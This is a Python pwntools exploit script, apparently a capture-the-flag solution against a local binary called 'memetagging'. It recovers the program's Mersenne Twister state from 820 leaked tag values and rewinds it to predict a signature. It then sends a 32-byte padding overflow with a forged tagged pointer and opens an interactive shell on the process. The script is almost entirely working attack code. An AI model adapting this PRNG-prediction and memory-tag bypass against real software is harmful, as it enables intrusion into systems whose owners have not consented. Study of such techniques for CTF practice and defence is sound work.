import random
from pwn import *
import struct

# MT19937Recover taken from https://github.com/eboda/mersenne-twister-recover
# and augmented with go_backwards function.
class MT19937Recover:
    """Reverses the Mersenne Twister based on 624 observed outputs.

    The internal state of a Mersenne Twister can be recovered by observing
    624 generated outputs of it. However, if those are not directly
    observed following a twist, another output is required to restore the
    internal index.

    See also https://en.wikipedia.org/wiki/Mersenne_Twister#Pseudocode .

    """
    def unshiftRight(self, x, shift):
        res = x
        for i in range(32):
            res = x ^ res >> shift
        return res

    def unshiftLeft(self, x, shift, mask):
        res = x
        for i in range(32):
            res = x ^ (res << shift & mask)
        return res

    def untemper(self, v):
        """ Reverses the tempering which is applied to outputs of MT19937 """

        v = self.unshiftRight(v, 18)
        v = self.unshiftLeft(v, 15, 0xefc60000)
        v = self.unshiftLeft(v, 7, 0x9d2c5680)
        v = self.unshiftRight(v, 11)
        return v

    def go(self, outputs, forward=True):
        """Reverses the Mersenne Twister based on 624 observed values.

        Args:
            outputs (List[int]): list of >= 624 observed outputs from the PRNG.
                However, >= 625 outputs are required to correctly recover
                the internal index.
            forward (bool): Forward internal state until all observed outputs
                are generated.

        Returns:
            Returns a random.Random() object.
        """

        result_state = None

        assert len(outputs) >= 624       # need at least 624 values

        ivals = []
        for i in range(624):
            ivals.append(self.untemper(outputs[i]))

        if len(outputs) >= 625:
            # We have additional outputs and can correctly
            # recover the internal index by bruteforce
            challenge = outputs[624]
            for i in range(1, 626):
                state = (3, tuple(ivals+[i]), None)
                r = random.Random()
                r.setstate(state)

                if challenge == r.getrandbits(32):
                    result_state = state
                    break
        else:
            # With only 624 outputs we assume they were the first observed 624
            # outputs after a twist -->  we set the internal index to 624.
            result_state = (3, tuple(ivals+[624]), None)

        rand = random.Random()
        rand.setstate(result_state)

        if forward:
            for i in range(624, len(outputs)):
                assert rand.getrandbits(32) == outputs[i]
        
        return rand

    def go_backwards(self, state):
        for i in range(623, 0, -1):
            result = 0
            tmp = state[i]
            tmp ^= state[(i + 397) % 624]

            if tmp & 0x80000000 == 0x80000000:
                tmp ^= 0x9908b0df
            result = (tmp << 1) & 0x80000000

            tmp = state[(i - 1 + 624) % 624]
            tmp ^= state[(i + 396) % 624]

            if tmp & 0x80000000 == 0x80000000:
                tmp ^= 0x9908b0df
                result |= 1

            result |= (tmp << 1) & 0x7fffffff
            state[i] = result
        
        rand = random.Random()
        rand.setstate((3, tuple(state + [0]), None))
        return rand

# Works most of the time
def pwnIt():

    p = process('./memetagging')
    
    n = []
    for _ in range(820):
        p.recvuntil('> ')
        p.sendline('2')
        p.sendline('1')
        p.sendline('0')
        text = p.recvuntil('Your name is')
        tag = int(text.split('tag: ')[1].split('\n')[0])
        n.append(tag)

    mtb = MT19937Recover()

    rng = mtb.go(n, False)

    rec = mtb.go_backwards(list(rng.getstate()[1][:-1]))

    offset = 623
    
    for _ in range(offset - 1):
        rec.getrandbits(32)
    
    signature = rec.getrandbits(32)
    
    ptr = (signature << 32) | 3
    msg = 'A' * 32 + struct.pack('Q', ptr)
    
    p.sendline('1')
    p.sendline(msg)
    p.interactive()

pwnIt()
